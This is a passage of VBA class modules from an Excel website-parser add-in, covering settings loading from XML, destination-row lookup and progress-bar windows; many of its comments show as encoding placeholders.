            Me.ColumnMode_UseCellText = CBool(Val(.Attributes.getNamedItem("CellText").text))
            
            With .SelectSingleNode("CheckColumn")
                Me.ColumnMode_CheckColumnEnabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
                Me.ColumnMode_CheckColumnNumber = Val(.Attributes.getNamedItem("Column").text)
                Me.ColumnMode_CheckColumnMask = .Attributes.getNamedItem("Mask").text
            End With
        End With
        
        With .SelectSingleNode("FoundColumnMode")
            Me.FoundColumnMode_Find_Text = .Attributes.getNamedItem("Find_Text").text
            Me.FoundColumnMode_Find_Row = Val(.Attributes.getNamedItem("Find_Row").text)
            Me.FoundColumnMode_Find_ColumnOffset = Val(.Attributes.getNamedItem("ColumnOffset").text)
            Me.FoundColumnMode_FirstRow = Val(.Attributes.getNamedItem("FirstRow").text)
            Me.FoundColumnMode_SelectedRowsOnly = CBool(Val(.Attributes.getNamedItem("SelectedRowsOnly").text))
            Me.FoundColumnMode_UseCellText = CBool(Val(.Attributes.getNamedItem("CellText").text))
            
            With .SelectSingleNode("CheckColumn")
                Me.FoundColumnMode_CheckColumnEnabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
                Me.FoundColumnMode_CheckColumnOffset = Val(.Attributes.getNamedItem("Offset").text)
                Me.FoundColumnMode_CheckColumnMask = .Attributes.getNamedItem("Mask").text
            End With
        End With
        
        With .SelectSingleNode("SheetRangeMode")
            Me.SheetRangeMode_Find_Type = Val(.Attributes.getNamedItem("Find_Type").text)
            Me.SheetRangeMode_Find_Text = .Attributes.getNamedItem("Find_Text").text
            Me.SheetRangeMode_SearchRange = .Attributes.getNamedItem("SearchRange").text
        End With
        
        With .SelectSingleNode("NumRangeMode")
            Me.NumRangeMode_MinValue = Val(.Attributes.getNamedItem("Min").text)
            Me.NumRangeMode_MaxValue = Val(.Attributes.getNamedItem("Max").text)
            Me.NumRangeMode_Step = Val(.Attributes.getNamedItem("Step").text)
            With .SelectSingleNode("ExcludeValues")
                Me.NumRangeMode_ExcludeValues = CBool(Val(.Attributes.getNamedItem("Enabled").text))
                Me.NumRangeMode_ExcludeValuesColumn = Val(.Attributes.getNamedItem("Column").text)
            End With
        End With
        
        With .SelectSingleNode("FixedValueMode")
            Me.FixedValueMode_Value = .Attributes.getNamedItem("Value").text
            Me.FixedValueMode_SomeValues = CBool(Val(.Attributes.getNamedItem("SomeValues").text))
        End With
        
        Set Me.Actions = New ArrayActions
        Set Me.Actions.ParentParser = Me.Parent
        Me.Actions.LoadFromXML .SelectSingleNode("Actions")
        Me.Actions.ActiveLevel = 1
    End With
End Sub



Attribute VB_Name = "ParserSourceItem"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserSourceItem
' Author        : Igor Vakhnenko            Date: 27.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Public ParentParser As WebsiteParser
Public Parent As ParserSourceData

Public Index As Long
Public value As String
Public SubValue As String        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Value

Private ColumnMode_DestinationRow As Range
Public SheetRangeMode_Cell As Range

Private Sub Class_Terminate()
    Set Parent = Nothing
    Set ParentParser = Nothing

    Set ColumnMode_DestinationRow = Nothing
    Set SheetRangeMode_Cell = Nothing
End Sub

Function SubValues() As Variant
    If Me.value = "" Then SubValues = Array("") Else SubValues = Split(Me.value, ARSEP$)
End Function

Sub SetDestinationRow(cell As Range)
    Set ColumnMode_DestinationRow = cell.EntireRow
End Sub

Function GetSourceRow() As Range
    If Me.Parent.Mode = ps_SheetRange Then
        Set GetSourceRow = SheetRangeMode_Cell
    Else
        Set GetSourceRow = ColumnMode_DestinationRow
    End If
End Function

Function GetDestinationCell() As Range
    On Error Resume Next
    Dim AnotherSheet As Boolean, FoundCell As Range, FindText$, CellWasFound As Boolean
    AnotherSheet = Me.ParentParser.Columns.SheetOptions.CreateNewWorkbook
    If Not AnotherSheet Then AnotherSheet = Not (Me.ParentParser.SourceData.SourceSheet Is Me.ParentParser.Sheet)

    If Me.Parent.IsColumnMode And (Me.ParentParser.Columns.OutputArrayValuesToSeparateRows = False) And (AnotherSheet = False) Then

        If Me.Parent.Mode = ps_SheetRange Then
            Set GetDestinationCell = Me.SheetRangeMode_Cell
        Else
            Set GetDestinationCell = ColumnMode_DestinationRow
        End If
        ParserVariables.item("{RowsNew}") = Val(ParserVariables.item("{RowsNew}")) + 1

    Else

        With Me.ParentParser.Sheet
            If Me.ParentParser.Columns.SearchForRow Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                FindText$ = Render(Me.ParentParser.Columns.SearchForRow_Text)
                If Len(Trim(FindText$)) Then
                    Set FoundCell = .Columns(Me.ParentParser.Columns.SearchForRow_Column).Find(FindText$, , xlValues, xlWhole).EntireRow
                    CellWasFound = Not (FoundCell Is Nothing)
                End If
                Set GetDestinationCell = FoundCell
            End If

            If Not CellWasFound Then                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Set GetDestinationCell = .Cells(.Rows.Count, Me.ParentParser.Columns.SheetOptions.BaseColumn).End(xlUp).Offset(1).EntireRow
                If GetDestinationCell.row = 2 Then If GetDestinationCell.EntireColumn.Cells(Me.ParentParser.Columns.SheetOptions.BaseColumn).value = "" Then _
                   Set GetDestinationCell = GetDestinationCell.Offset(-1)
                ParserVariables.item("{RowsNew}") = Val(ParserVariables.item("{RowsNew}")) + 1
            Else
                ParserVariables.item("{RowsUpdated}") = Val(ParserVariables.item("{RowsUpdated}")) + 1
            End If
        End With

    End If
End Function
Attribute VB_Name = "ProgressIndicator"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ProgressIndicator                    Version: 2
' Author        : Igor Vakhnenko                   Date: 21.07.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Public FP As New F_Progress
Public SubActionIndex As Single, SubActionsCount As Single, SubActionsStep&
Private FPVisible As Boolean, FPStartTime As Date, Position&
Private PrS&, PrE&, Percent As Double, LogString$

Public Parent As ProgressIndicator, Children As New Collection
Public ShowPercents As Boolean, ShowTime As Boolean, ShowTimeInLog As Boolean

Dim MSG_EstimatedTime$, BTN_Stop$

Function AddChildIndicator(ByVal Caption$, Optional ByVal FPPosition& = 1) As ProgressIndicator
    On Error Resume Next
    Set AddChildIndicator = New ProgressIndicator
    Set AddChildIndicator.Parent = Me
    AddChildIndicator.Show Caption, FPPosition
    Children.Add AddChildIndicator
End Function

Private Sub Class_Terminate()
    On Error Resume Next
    Unload FP: FPVisible = False
    Set FP = Nothing
    Set Children = Nothing
    Set Parent = Nothing
End Sub

Private Sub Class_Initialize()
    Set FP = New F_Progress: ShowPercents = True: FPVisible = True
    PrS = 0: PrE = 100: Set_ProgressBar 0: FP.PrBar.Caption = ""
    FPStartTime = Now: ShowTime = True: ShowPercents = True: SubActionsStep = 1
    Set FP.Indicator = Me

    On Error Resume Next
    MSG_EstimatedTime$ = Run(TWN & "tt", "PI_MSG_EstimatedTime")
    If MSG_EstimatedTime$ = "" Then MSG_EstimatedTime$ = "Estimated time left"
    BTN_Stop$ = Run(TWN & "tt", "PI_BTN_Cancel")
    If BTN_Stop$ = "" Then BTN_Stop$ = "Cancel"
    FP.CommandButton_stop.Caption = BTN_Stop$
    Err.Clear
End Sub

Sub Show(ByVal Caption$, Optional ByVal FPPosition& = 0, Optional LogSize& = 0)
    On Error Resume Next
    SetProgressFormCaption Caption: On Error Resume Next:
    FP.PrBar.Width = ProgressBar_Default_Width
    Position = FPPosition
    FP.Tag = Caption: FP.Show:
    If Position <> 0 Then Move Position
    FP.Repaint: DoEvents
    FP.SpinButton_log.value = LogSize
    FP.SpinButton_log.Visible = LogSize > 0
    SetLogSize LogSize
End Sub

Sub Hide()
    Unload FP
    FPVisible = False
End Sub

Sub Repaint()
    FP.Repaint: DoEvents
    'If Application.ScreenUpdating = False Then Application.ScreenUpdating = True: Application.ScreenUpdating = False
End Sub

Sub Move(ByVal Position&)
    If Abs(Position) > 3 Then Exit Sub
    If Not Me.Parent Is Nothing Then
        FP.Top = Me.Parent.FP.Top + Me.Parent.FP.Height + 10 + (FP.Height + 3) * (Position - 1)
    Else
        FP.Top = FP.Top + (FP.Height + 3) * Position
    End If
End Sub

Public Property Get Visible(): Visible = FPVisible: End Property

Public Property Let line1(ByVal NewValue$): FP.L1.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let line2(ByVal NewValue$): FP.L2.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let line3(ByVal NewValue$): FP.L3.Caption = ProcessLabel(NewValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Caption(ByVal NewValue$): SetProgressFormCaption NewValue: End Property

Private Sub SetProgressFormCaption(Optional ByVal Caption$ = "")
    Dim txt$, dt$
    If Len(Caption) > 0 Then FP.Tag = Caption
    txt = Trim(FP.Tag): If ShowPercents Then txt = Fix(Percent) & " %   " & txt
    dt = Format(Now - FPStartTime, "HH:NN:SS")
    If ShowTime Then txt = "( " & dt & " )    " & txt
    FP.Caption = txt
End Sub

Private Function TimeToFinish$()
    On Error Resume Next: Dim dt As Single
    If Percent < 15 Then Exit Function
    dt = (Now - FPStartTime) * (100 - Percent) / Percent
    TimeToFinish$ = Format(dt, "H:NN:SS")
    TimeToFinish$ = MSG_EstimatedTime$ & ": " & TimeToFinish$
End Function

Sub SetFocus()
    FP.Show 0: If Position <> 0 Then Move Position
End Sub

Private Sub UpdateLabels(Optional ByVal L1_txt$, Optional ByVal L2_txt$, Optional ByVal L3_txt$)
    If Len(L1_txt$) > 0 Then FP.L1.Caption = ProcessLabel(L1_txt$)
    If Len(L1_txt$) + Len(L2_txt$) > 0 Then FP.L2.Caption = ProcessLabel(L2_txt$)
    If Len(L1_txt$) + Len(L2_txt$) + Len(L3_txt$) > 0 Then FP.L3.Caption = ProcessLabel(L3_txt$)
End Sub

Private Function ProcessLabel$(ByVal txt$)
    If txt Like "*$index*" Then txt = Replace(txt, "$index", SubActionIndex)
    If txt Like "*$count*" Then txt = Replace(txt, "$count", SubActionsCount)
    If txt Like "*$time*" Then txt = Replace(txt, "$time", TimeToFinish)
    ProcessLabel = txt
    SetProgressFormCaption
End Function

Sub SubAction(Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = "", Optional ByVal L3_txt$ = "")
    On Error Resume Next
    If SubActionsCount = 0 Then SubActionsCount = 1
    SubActionIndex = SubActionIndex + 1 * SubActionsStep
    If SubActionIndex > SubActionsCount Then SubActionIndex = SubActionsCount
    Percent = PrS + (PrE - PrS) * ((SubActionIndex - 1) / SubActionsCount)
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar Percent: DoEvents
End Sub

Sub StartNewAction(Optional ByVal Pr_Start& = 0, Optional ByVal Pr_End& = 100, _
                   Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = " ", Optional ByVal L3_txt$ = " ", _
                   Optional ByVal Actions_Count& = 0)
    On Error Resume Next
    PrS = Pr_Start: PrE = Pr_End: SubActionIndex = 0: SubActionsCount = Actions_Count
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar PrS
End Sub

Sub UpdateFromChild(ByVal ChildPercent As Double)
    If SubActionsCount = 0 Then
        Percent = PrS + (PrE - PrS) * (ChildPercent / 100)
    Else
        Percent = PrS + (PrE - PrS) / SubActionsCount * (SubActionIndex - 1) + (PrE - PrS) / SubActionsCount * (ChildPercent / 100)
    End If
    Set_ProgressBar Percent
End Sub

Private Sub Set_ProgressBar(ByVal NewPercent As Double)
    On Error Resume Next: Percent = NewPercent
    If NewPercent > 100 Then Percent = 100
    If NewPercent < 0 Then Percent = 0
    FP.PrBar.Width = Int(Percent * ProgressBar_Default_Width / 100)
    SetProgressFormCaption
    FP.Repaint
    If Not Parent Is Nothing Then Parent.UpdateFromChild Percent
End Sub

Private Function ProgressBar_Default_Width() As Double
    ProgressBar_Default_Width = FP.Width - 18
End Function

Function CancelButton() As MSForms.CommandButton
    Set CancelButton = FP.CommandButton_stop
End Function

Sub SetLogSize(ByVal n&)
    On Error Resume Next
    If n < 0 Then n = 0
    If n > 5 Then n = 5
    FP.SpinButton_log.value = n
    FP.SpinButton_log.Visible = n > 0
End Sub

Sub Log(ByVal txt$, Optional ByVal MaxLen& = 0)
    On Error Resume Next: Dim currtime$, NewText$
    If ShowTimeInLog Then currtime$ = Time & vbTab
    LogString = LogString & vbNewLine & currtime$ & txt
    NewText$ = Mid(LogString, 3): If MaxLen& Then NewText$ = Right(NewText$, MaxLen&)
    FP.TextBox_Log.text = NewText$
    If FP.SpinButton_log.value = 0 Then FP.SpinButton_log.value = 2: FP.SpinButton_log.Visible = True
    FP.CommandButton_stop.SetFocus: FP.TextBox_Log.SetFocus
End Sub

Sub ClearLog()
    LogString = "": FP.TextBox_Log.text = ""
End Sub

Sub ShowLog()
    On Error Resume Next: Dim FileName$
    FileName$ = Environ("TEMP") & "\macro_log.txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(FileName, True)
        .Write Mid(LogString, 3): .Close
    End With
    FollowHyperlink """" & FileName$ & """"
End Sub

Sub AddButton(ByVal Caption$, ByVal Macro$)
    Const dd& = 18
    If FP.SpinButton_log = 0 Then FP.SpinButton_log = 1
    With Me.FP.CommandButton_RunMacro
        .Caption = Caption$
        .Visible = True
        .Top = FP.Height - .Height - dd - 20
        .Left = FP.Width - .Width - dd - 15
    End With
    FP.ButtonMacro = Macro$
End Sub

Function MacroButton() As MSForms.CommandButton
    Set MacroButton = FP.CommandButton_RunMacro
End Function

Sub QueryClose()
    On Error Resume Next
    Dim pi As ProgressIndicator
    For Each pi In Children
        pi.QueryClose
        pi.Hide
    Next pi
End Sub


Attribute VB_Name = "ProgressIndicatorNew"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ProgressIndicatorNew                    Version: 3.0
' Author        : Igor Vakhnenko                   Date: 03.11.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit

Public FP As F_ProgressNew, Parent As ProgressIndicatorNew, Children As New Collection
Public TestMode As Boolean, Temporary As Boolean
Dim HideMessage_Time As Date

Dim SubActionIndex As Single, SubActionsCount As Single, SubActionsStep&
Dim FPStartTime As Date, LogString$, ShowTimeInLog As Boolean, MSG_EstimatedTime$, BTN_Stop$

Dim Lines(1 To 100, 1 To 9) As Variant
Dim LinesCount As Long

' Lines(i, 1) - vCurrent! (|fffd||fffd| 0 |fffd||fffd| 1)
' Lines(i, 2) - vNew! (|fffd||fffd| 0 |fffd||fffd| 1)
' Lines(i, 3) - vFrom! (|fffd||fffd| 0 |fffd||fffd| 1)
' Lines(i, 4) - vTo! (|fffd||fffd| 0 |fffd||fffd| 1)
' Lines(i, 5) - Text$
' Lines(i, 6) - NewText$
' Lines(i, 7) - Line Enabled (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - 0 |fffd||fffd||fffd| 1)
' Lines(i, 8) - Line Enabled New (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - 0 |fffd||fffd||fffd| 1)
' Lines(i, 9) - Hide Bar (0 - |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| 1 - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

Sub UpdateIndicator(Optional ByVal Rebuild As Boolean = False)
    On Error Resume Next
    Dim i&, HideBar As Boolean
    'Debug.Print Now, "UpdateIndicator"
    With FP
        For i = 1 To LinesCount
            HideBar = False    'Val(Lines(i, 9))
            If Val(Lines(i, 8)) = 0 Then
                .HideLine i
                ' Debug.Print "HideLine " & i
            Else
                .AddLine i, HideBar
                ' Debug.Print "AddLine", i, "HideBar=" & HideBar

                If Rebuild Or (Abs(Lines(i, 1) - Lines(i, 2)) >= 0.003) Then
                    If Not HideBar Then Lines(i, 1) = Lines(i, 2): .SetBar i, Lines(i, 2)
                    'Debug.Print "SetBar " & i, Round(Lines(i, 2) * 100, 0) & " %"
                End If
                If Rebuild Or (Lines(i, 5) <> Lines(i, 6)) Or (Lines(i, 7) <> Lines(i, 8)) Then
                    .SetText i, Lines(i, 6)
                    Lines(i, 5) = Lines(i, 6)
                    'Debug.Print "SetText " & i, Lines(i, 6)
                End If
            End If
            Lines(i, 7) = Lines(i, 8)
        Next

        If .ShowStatus Then .Label_Status = StatusText
        '.Repaint
        DoEvents

        If HideMessage_Time > 0 Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If .ShowMessages Then
                HideMessage_Time = 0
            Else
                If HideMessage_Time <= Now Then HideMessage_Time = 0: .ResizeForm
            End If
        End If
    End With
End Sub

Sub ShowLine(ByVal LineIndex&, ByVal CurrentValue&, ByVal MaxValue&, ByVal LineText$)
    On Error Resume Next    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    'Debug.Print "ShowLine", LinesCount, LineIndex&, LineText$

    'If LinesCount < LineIndex& Then Debug.Print "ShowLine", LinesCount, LineIndex&: LinesCount = LineIndex&
    If LinesCount < LineIndex& Then LinesCount = LineIndex&
    'If MaxValue& <= 0 Then Debug.Print "PI error: MaxValue&=" & MaxValue&: Exit Sub
    If MaxValue& <= 0 Then Exit Sub
    If CurrentValue& <= 0 Then Debug.Print "PI error: CurrentValue&=" & MaxValue&: CurrentValue& = 1

    Dim vFrom!, vTo!, IsLastRow As Boolean, i&
    IsLastRow = IsLastBar(LineIndex&)

    vFrom! = (CurrentValue& - 1 - IsLastRow) / MaxValue&
    vTo! = (CurrentValue& - IsLastRow) / MaxValue&
    If vFrom! > 1 Then vFrom! = 1
    If vTo! > 1 Then vTo! = 1

    UpdateLine LineIndex&, vFrom!, vTo!
    UpdateText LineIndex&, LineText$
    'For i = LineIndex& + 1 To LinesCount: HideLine i: Debug.Print "hide line " & i & " with line index = " & LineIndex& & " and text " & LineText$: Next
    For i = LineIndex& + 1 To LinesCount: HideLine i: Next
    UpdateIndicator
End Sub

Function IsLastBar(ByVal LineIndex&) As Boolean    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    IsLastBar = (LinesCount = LineIndex&) And (LineIndex& > 1)
End Function

Private Sub UpdateLine(ByVal LineIndex&, ByVal vFrom!, ByVal vTo!)
    On Error Resume Next: Dim i&
    Lines(LineIndex&, 3) = vFrom!
    Lines(LineIndex&, 4) = vTo!
    Lines(LineIndex&, 2) = vFrom!    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Lines(i, 9) = 0
    For i = LineIndex& - 1 To 1 Step -1: UpdatePercent i: Next    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If LineIndex& = 1 Then If Not Me.Parent Is Nothing Then Me.Parent.UpdateFromChild Me.GetCurrentPercent    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
End Sub

Sub UpdateFromChild(ByVal ChildPercent As Single)
    UpdatePercent LinesCount, ChildPercent
    UpdateIndicator
End Sub

Sub UpdateLine_OldQuery(ByVal LineIndex&, NewText$)
    On Error Resume Next
    UpdateText LineIndex&, ProcessLabel(NewText$)
    UpdateIndicator True
    DoEvents
End Sub

Private Sub UpdateText(ByVal LineIndex&, ByVal NewText$)
    On Error Resume Next
    'If LinesCount < LineIndex& Then Debug.Print "UpdateText", LinesCount, LineIndex&, NewText$: LinesCount = LineIndex&
    If LinesCount < LineIndex& Then LinesCount = LineIndex&
    Lines(LineIndex&, 6) = NewText$
    If (Lines(LineIndex&, 5) <> Lines(LineIndex&, 6)) Or (NewText$ <> "") Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If NewText$ <> "" Then    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            If Val(Lines(LineIndex&, 8)) = 0 And LineIndex& > 1 Then Lines(LineIndex&, 9) = 1  ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Lines(LineIndex&, 8) = 1
        Else    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            If LineIndex& = LinesCount Then LinesCount = LinesCount - 1: HideLine LineIndex&
        End If
    End If
End Sub

Private Sub HideLine(ByVal LineIndex&)
    On Error Resume Next: Lines(LineIndex&, 8) = 0
End Sub

Private Sub UpdatePercent(ByVal LineIndex&, Optional NewPercent As Single = -1)
    On Error Resume Next: Dim ParentPercent!
    If NewPercent = -1 Then ParentPercent! = Lines(LineIndex& + 1, 2) Else ParentPercent! = NewPercent
    Lines(LineIndex&, 2) = Lines(LineIndex&, 3) + (Lines(LineIndex&, 4) - Lines(LineIndex&, 3)) * ParentPercent!
End Sub

Function GetCurrentPercent() As Single
    GetCurrentPercent = Lines(1, 2)
End Function

Sub SubAction(Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = "", Optional ByVal L3_txt$ = "")
    On Error Resume Next    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If SubActionsCount = 0 Then SubActionsCount = 1
    SubActionIndex = SubActionIndex + 1 * SubActionsStep
    If SubActionIndex > SubActionsCount Then SubActionIndex = SubActionsCount
    Lines(2, 8) = 1    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|

    Dim vFrom!, vTo!
    vFrom! = (SubActionIndex) / SubActionsCount
    vTo! = (SubActionIndex + 1) / SubActionsCount
    UpdateLine 2, vFrom!, vTo!

    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    UpdateIndicator
End Sub

Sub StartNewAction(Optional ByVal Pr_Start& = 0, Optional ByVal Pr_End& = 100, _
                   Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = "", Optional ByVal L3_txt$ = "", _
                   Optional ByVal Actions_Count& = 0)
    On Error Resume Next    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    SubActionIndex = 0: SubActionsCount = Actions_Count
    Dim i&: LinesCount = 3
    Lines(1, 8) = 1: Lines(2, 8) = 1: Lines(3, 8) = 1    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Lines(1, 9) = 0: Lines(2, 9) = 1: Lines(3, 9) = 1    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| 2 |fffd| 3 |fffd||fffd||fffd||fffd||fffd|

    UpdateLine 1, Pr_Start& / 100, Pr_End& / 100
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    UpdateIndicator
End Sub

Sub StartNewActionNew(Optional ByVal Pr_Start& = 0, Optional ByVal Pr_End& = 100, _
                   Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = "", Optional ByVal L3_txt$ = "", _
                   Optional ByVal Actions_Count& = 0)
    On Error Resume Next    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    SubActionIndex = 0: SubActionsCount = Actions_Count
    Dim i&: LinesCount = 3
    Lines(1, 8) = 1: Lines(2, 8) = 0: Lines(3, 8) = 0    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Lines(1, 9) = 0: Lines(2, 9) = 1: Lines(3, 9) = 1    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| 2 |fffd| 3 |fffd||fffd||fffd||fffd||fffd|

    UpdateLine 1, Pr_Start& / 100, Pr_End& / 100
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    UpdateIndicator
End Sub

Private Sub UpdateLabels(Optional ByVal L1_txt$, Optional ByVal L2_txt$, Optional ByVal L3_txt$)
    On Error Resume Next    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If Len(L1_txt$) > 0 Then UpdateText 1, ProcessLabel(L1_txt$)
    If Len(L1_txt$) + Len(L2_txt$) > 0 Then UpdateText 2, ProcessLabel(L2_txt$)
    If Len(L1_txt$) + Len(L2_txt$) + Len(L3_txt$) > 0 Then UpdateText 3, ProcessLabel(L3_txt$)
End Sub

Function AddChildIndicator(ByVal Caption$, Optional ByVal FPPosition& = 1) As ProgressIndicatorNew
    On Error Resume Next
